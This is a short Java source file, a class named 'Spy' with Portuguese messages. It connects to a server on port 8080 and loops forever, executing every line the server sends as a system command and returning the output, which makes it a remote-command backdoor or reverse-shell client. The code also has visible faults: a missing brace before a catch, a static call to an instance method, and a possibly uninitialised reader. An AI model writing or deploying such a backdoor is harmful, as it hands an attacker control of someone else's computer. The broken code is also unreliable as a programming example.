import java.util.*;
import java.io.*;
import java.net.*;

public class Spy{

	public void error(){
		System.exit(-1);
	}

	public static void main(String args[]) throws UnknownHostException, IOException{

		final int port = 8080;
		ServerSocket servidor;
		Socket socketCliente;	
		Scanner scanner = new Scanner(System.in);
		BufferedReader reader;
		String lido = "";
		OutputStreamWriter writer;
		Runtime runtime;
		Process process;
		BufferedReader soBuffer;
		StringBuffer stringbuffer = new StringBuffer();
		
		
		try{
			socketCliente = new Socket("127.0.0.1", port);
		}catch(Exception error){
			error.getMessage();
			error();
		}
		System.out.println("Conexao estabelecida");

		do{
			try{
				reader = new BufferedReader(new InputStreamReader(socketCliente.getInputStream()));
			}catch(Exception error){
				error.getMessage();
			}
			lido = reader.readLine();
			System.out.println("Servidor SAYS: "  + lido);	
			
			runtime = Runtime.getRuntime();
			process = runtime.exec(lido);
			process.waitFor();
			
			try{
				writer = new OutputStreamWriter(socketCliente.getOutputStream());
			catch(Exception error){
				error.getMessage();
				error();
			}
			PrintWriter out = new PrintWriter(writer);
			
			

			soBuffer = new BufferedReader(new InputStreamReader(process.getInputStream()));
			lido = "";
			String fina = "";
			while ((lido = soBuffer.readLine()) != null) {
				System.out.println(lido);
				
				fina = fina + lido;
			}
			
			out.println( fina );
			out.flush();

		}while( true );


		

	
	}

}
